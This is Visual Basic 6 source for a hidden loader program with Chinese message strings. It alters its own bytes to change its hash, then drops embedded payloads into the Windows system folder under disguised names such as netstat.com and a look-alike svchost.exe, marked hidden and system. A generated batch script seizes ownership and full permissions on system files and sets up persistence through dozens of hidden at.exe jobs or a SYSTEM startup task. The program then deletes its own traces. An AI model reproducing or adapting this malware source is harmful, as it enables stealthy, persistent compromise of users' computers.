VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   ClientHeight    =   90
   ClientLeft      =   -10245
   ClientTop       =   -10245
   ClientWidth     =   90
   Icon            =   "loader.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   90
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Const MAX_PATH = 260
Private Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OVSERSIONINFOEX) As Long
Private Type OVSERSIONINFOEX
    dwOVSersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
    wServicePackMajor As Integer
    wServicePackMinor As Integer
    wSuiteMask As Integer
    wProductType As Byte
    wReserved As Byte
End Type
Private sysPath As String
Private appFullPath As String
Private tempPath As String
Private tempexe As String

Private Function getTimeString() As String
    On Error Resume Next
    getTimeString = Format(Now, "yyyymmddhhnnss") & (Timer * 10) Mod 10
End Function

Private Function TempDir() As String
    On Error Resume Next
    Dim lpBuffer As String
    lpBuffer = Space(MAX_PATH)
    TempDir = Left(lpBuffer, GetTempPath(MAX_PATH, lpBuffer))
End Function

Private Function SystemDir() As String
    On Error Resume Next
    Dim tmp As String
    tmp = Space(MAX_PATH)
    SystemDir = Left(tmp, GetSystemDirectory(tmp, MAX_PATH))
End Function

Private Sub Form_Load()
    On Error Resume Next
    App.TaskVisible = False
    tempPath = TempDir
    sysPath = SystemDir
    appFullPath = App.Path & IIf(Len(App.Path) > 3, "\", "") & App.EXEName & ".exe"
    Dim starterLen As Long
    starterLen = 8704
    Dim serverLen As Long
    serverLen = 67584
    Dim plugLength As Long
    plugLength = 22528
    Dim bytes() As Byte
    Dim loadLen As Long
    Dim endStr As String
    Err.Clear
    tempexe = tempPath & getTimeString & ".exe"
    Name appFullPath As tempexe
    If Err Then '读写检查
        MsgBox "磁盘读写错误", vbOKOnly + vbCritical, "IO Error"
        End
    End If
    Open tempexe For Binary As #1 'change md5
    Open appFullPath For Binary As #2
        ReDim bytes(LOF(1) - 1)
        Get #1, 1, bytes
        Put #2, 1, bytes
        ReDim bytes(19)
        Get #1, LOF(1) - 19, bytes
        endStr = Trim(StrConv(CStr(bytes), vbUnicode))
        If IsNumeric(endStr) Then
            loadLen = Val(endStr)
        Else
            loadLen = 0
        End If
        Put #2, LOF(1) - 19 - loadLen - 30, getTimeString & "000000000000000"
        Put #2, LOF(1) - 19 - loadLen - 30 - plugLength - 30, getTimeString & "000000000000000"
        Put #2, LOF(1) - 19 - loadLen - 30 - plugLength - 30 - plugLength - 30, getTimeString & "000000000000000"
        Put #2, LOF(1) - 19 - loadLen - 30 - plugLength - 30 - plugLength - 30 - plugLength - 30, getTimeString & "000000000000000"
        Put #2, LOF(1) - 19 - loadLen - 30 - plugLength - 30 - plugLength - 30 - plugLength - 30 - serverLen - 30, getTimeString & "000000000000000"
    Close #2
    Close #1
    'check windows 7
    Dim checkUAC As String
    checkUAC = sysPath & "\UAC" & getTimeString & ".exe"
    Err.Clear
    Open checkUAC For Binary As #1
        Put #1, 1, "check"
    Close #1
    If Err Then 'windows 7 protected
        MsgBox "请以管理员身份运行本程序", vbOKOnly + vbExclamation, "兼容性检查"
        killMe
    End If
    Kill checkUAC
    'loader start
    If IsNumeric(endStr) Then
        If loadLen > 0 Then
            endStr = tempPath & getTimeString & "loaded.exe"
            Open tempexe For Binary As #1
            Open endStr For Binary As #2
                ReDim bytes(loadLen - 1)
                Get #1, LOF(1) - 19 - loadLen, bytes
                Put #2, 1, bytes
            Close #2
            Close #1
            Shell "cmd.exe /D /C ""start """" /wait """ & endStr & """ & del /F /Q """ & endStr & """""", vbNormalFocus
        Else
            MsgBox "文件已损坏", vbOKOnly + vbCritical, "错误"
            killMe
        End If
    Else
        Shell endStr, vbNormalFocus
    End If
    'check if loaded
    If Dir(sysPath & "\ntio405.dat", vbHidden + vbSystem) = "" Or Dir(sysPath & "\DXcache\dx8vb.exe", vbHidden + vbSystem) = "" Then
        Sleep 3000
        Open sysPath & "\ntdos405.dat" For Binary As #2
        Close #2
        
        Open sysPath & "\svctemp.exe" For Binary As #2
        Close #2
        
        Open sysPath & "\svchost.exe　" For Binary As #2
        Close #2
    
        Open tempexe For Binary As #1
        Open sysPath & "\netstat.com" For Binary As #2
            ReDim bytes(plugLength - 1)
            Get #1, LOF(1) - 19 - loadLen - 30 - plugLength, bytes
            Put #2, 1, bytes
            Put #2, , getTimeString & "000000000000000"
        Close #2
        SetAttr sysPath & "\netstat.com", vbSystem + vbHidden
        
        Open sysPath & "\schtasks.com" For Binary As #2
            ReDim bytes(plugLength - 1)
            Get #1, LOF(1) - 19 - loadLen - 30 - plugLength - 30 - plugLength, bytes
            Put #2, 1, bytes
            Put #2, , getTimeString & "000000000000000"
        Close #2
        SetAttr sysPath & "\schtasks.com", vbSystem + vbHidden
        
        Open sysPath & "\at.com" For Binary As #2
            ReDim bytes(plugLength - 1)
            Get #1, LOF(1) - 19 - loadLen - 30 - plugLength - 30 - plugLength - 30 - plugLength, bytes
            Put #2, 1, bytes
            Put #2, , getTimeString & "000000000000000"
        Close #2
        SetAttr sysPath & "\at.com", vbSystem + vbHidden
    
        Open sysPath & "\ntio405.dat" For Binary As #2
            ReDim bytes(serverLen - 1)
            Get #1, LOF(1) - 19 - loadLen - 30 - plugLength - 30 - plugLength - 30 - plugLength - 30 - serverLen, bytes
            Put #2, 1, bytes
            Put #2, , getTimeString & "000000000000000"
        Close #2
        SetAttr sysPath & "\ntio405.dat", vbSystem
    
        MkDir sysPath & "\DXcache"
        Open sysPath & "\DXcache\dx8vb.exe" For Binary As #2
            ReDim bytes(starterLen - 1)
            Get #1, LOF(1) - 19 - loadLen - 30 - plugLength - 30 - plugLength - 30 - plugLength - 30 - serverLen - 30 - starterLen, bytes
            Put #2, 1, bytes
            Put #2, , getTimeString & "000000000000000"
        Close #2
        Close #1
    
        SetAttr sysPath & "\propares.bat", vbNormal
        Kill sysPath & "\propares.bat"
        Open sysPath & "\propares.bat" For Output As #1
            Print #1, "@echo off"
            Print #1, "sc.exe config schedule start= auto & sc.exe start schedule"
            'Print #1, "cacls.exe """ & sysPath & "\DXcache"" /T /E /C /R Everyone"
            'Print #1, "cacls.exe """ & sysPath & "\DXcache"" /T /E /C /G Everyone:R"
            'Print #1, "cacls.exe """ & sysPath & "\DXcache"" /T /E /C /R Administrators"
            'Print #1, "cacls.exe """ & sysPath & "\DXcache"" /T /E /C /R SYSTEM"
            'Print #1, "cacls.exe """ & sysPath & "\DXcache"" /T /E /C /R ""CREATOR OWNER"""
            'Print #1, "cacls.exe """ & sysPath & "\DXcache"" /T /E /C /R Users"
            'Print #1, "cacls.exe """ & sysPath & "\DXcache"" /T /E /C /R """ & CurrentUser & """"
            Print #1, "takeown.exe /F """ & sysPath & "\svchost.exe　"""
            Print #1, "takeown.exe /F """ & sysPath & "\DXcache"""
            Print #1, "takeown.exe /F """ & sysPath & "\DXcache\dx8vb.exe"""
            Print #1, "takeown.exe /F """ & sysPath & """"
            Print #1, "takeown.exe /F """ & sysPath & "\ntdos405.dat"""
            Print #1, "takeown.exe /F """ & sysPath & "\svctemp.exe"""
            Print #1, "takeown.exe /F """ & sysPath & "\svchost.exe"""
            Print #1, "takeown.exe /F """ & sysPath & "\ntio405.dat"""
            Print #1, "cacls.exe """ & sysPath & "\svchost.exe　"" /E /C /G Administrators:F"
            Print #1, "cacls.exe """ & sysPath & "\svchost.exe　"" /E /C /G """ & CurrentUser & """:F"
            Print #1, "cacls.exe """ & sysPath & "\DXcache"" /E /C /G Administrators:F"
            Print #1, "cacls.exe """ & sysPath & "\DXcache"" /E /C /G """ & CurrentUser & """:F"
            Print #1, "cacls.exe """ & sysPath & "\DXcache\dx8vb.exe"" /E /C /G Administrators:F"
            Print #1, "cacls.exe """ & sysPath & "\DXcache\dx8vb.exe"" /E /C /G """ & CurrentUser & """:F"
            Print #1, "cacls.exe """ & sysPath & """ /E /C /G Administrators:F"
            Print #1, "cacls.exe """ & sysPath & """ /E /C /G """ & CurrentUser & """:F"
            Print #1, "cacls.exe """ & sysPath & "\ntdos405.dat"" /E /C /G Administrators:F"
            Print #1, "cacls.exe """ & sysPath & "\ntdos405.dat"" /E /C /G """ & CurrentUser & """:F"
            Print #1, "cacls.exe """ & sysPath & "\svctemp.exe"" /E /C /G Administrators:F"
            Print #1, "cacls.exe """ & sysPath & "\svctemp.exe"" /E /C /G """ & CurrentUser & """:F"
            Print #1, "cacls.exe """ & sysPath & "\svchost.exe"" /E /C /G Administrators:F"
            Print #1, "cacls.exe """ & sysPath & "\svchost.exe"" /E /C /G """ & CurrentUser & """:F"
            Print #1, "cacls.exe """ & sysPath & "\ntio405.dat"" /E /C /G Administrators:F"
            Print #1, "cacls.exe """ & sysPath & "\ntio405.dat"" /E /C /G """ & CurrentUser & """:F"
            If checkTaskEnv = False Then
                Print #1, "attrib.exe ""%SystemRoot%\Tasks\At*.job"" -s -h & del ""%SystemRoot%\Tasks\At9999*.job"""
                Print #1, "ren ""%SystemRoot%\Tasks\At*.job"" At*.boj"
                Dim i As Long
                For i = 0 To 23
                    Print #1, "at.exe " & i & ":00 /interactive /every:sunday,monday,tuesday,wednesday,thursday,friday,saturday """ & sysPath & "\DXcache\dx8vb.exe"""
                Next i
                For i = 0 To 23
                    Print #1, "at.exe " & i & ":15 /interactive /every:sunday,monday,tuesday,wednesday,thursday,friday,saturday """ & sysPath & "\DXcache\dx8vb.exe"""
                Next i
                For i = 0 To 23
                    Print #1, "at.exe " & i & ":30 /interactive /every:sunday,monday,tuesday,wednesday,thursday,friday,saturday """ & sysPath & "\DXcache\dx8vb.exe"""
                Next i
                For i = 0 To 23
                    Print #1, "at.exe " & i & ":45 /interactive /every:sunday,monday,tuesday,wednesday,thursday,friday,saturday """ & sysPath & "\DXcache\dx8vb.exe"""
                Next i
                'Print #1, "for %%i in (""%SystemRoot%\Tasks\At*.job"") do ("
                'Print #1, "set ""var=%%~nxi"""
                'Print #1, "setlocal enabledelayedexpansion"
                'Print #1, "if not ""!var:~0,6!""==""At9999"" ren ""%%i"" ""At9999!var:~2!"""
                'Print #1, "endlocal"
                'Print #1, ")"
                For i = 1 To 96
                    Print #1, "ren ""%SystemRoot%\Tasks\At" & i & ".job"" At9999" & i & ".boj"
                Next i
                Print #1, "del /F /Q ""%SystemRoot%\Tasks\At*.job""" '防止有些At.job改名失败
                Print #1, "ren ""%SystemRoot%\Tasks\At*.boj"" At*.job"
                Print #1, "attrib.exe ""%SystemRoot%\Tasks\At9999*.job"" +s +h"
            Else
                Print #1, "schtasks.exe /Create /F /RU ""SYSTEM"" /SC ONSTART /TN ""DXCache"" /TR """ & sysPath & "\DXcache\dx8vb.exe"""
            End If
            Print #1, "del /F /Q """ & sysPath & "\propares.bat"""
        Close #1
        'Shell sysPath & "\propares.bat", vbHide
        StartCmdProc
        Sleep 2000
        WriteCMD """" & sysPath & "\propares.bat""" & vbNewLine
        For i = 1 To 600
            Sleep 1000
            ReadCMD
            If Dir(sysPath & "\propares.bat", vbHidden + vbSystem) = "" Then Exit For 'bat finished
        Next i
        CloseCmdShell
        Sleep 2000
    Else
        Shell "sc.exe config schedule start= auto & sc.exe start schedule", vbHide
    End If
    killMe
End Sub

Private Sub killMe()
    On Error Resume Next
    Shell "cmd.exe /D /C ""ping -n 3 127.1 & del /F /Q """ & tempexe & """""", vbHide
    End
End Sub

Private Function checkTaskEnv() As Boolean
    On Error Resume Next
    checkTaskEnv = False
    Dim OVS As OVSERSIONINFOEX
    OVS.dwOVSersionInfoSize = Len(OVS)
    GetVersionEx OVS
    If OVS.dwPlatformId = 2 And OVS.dwMajorVersion >= 6 Then checkTaskEnv = True
End Function

Private Function CurrentUser() As String
    On Error Resume Next
    Dim strUsername As String
    Dim lngUserNameSize As Long
    lngUserNameSize = 31
    strUsername = String(lngUserNameSize + 1, 0)
    If GetUserName(strUsername, lngUserNameSize) = 1 Then
        CurrentUser = Left(strUsername, lngUserNameSize - 1)
    Else
        CurrentUser = vbNullString
    End If
End Function
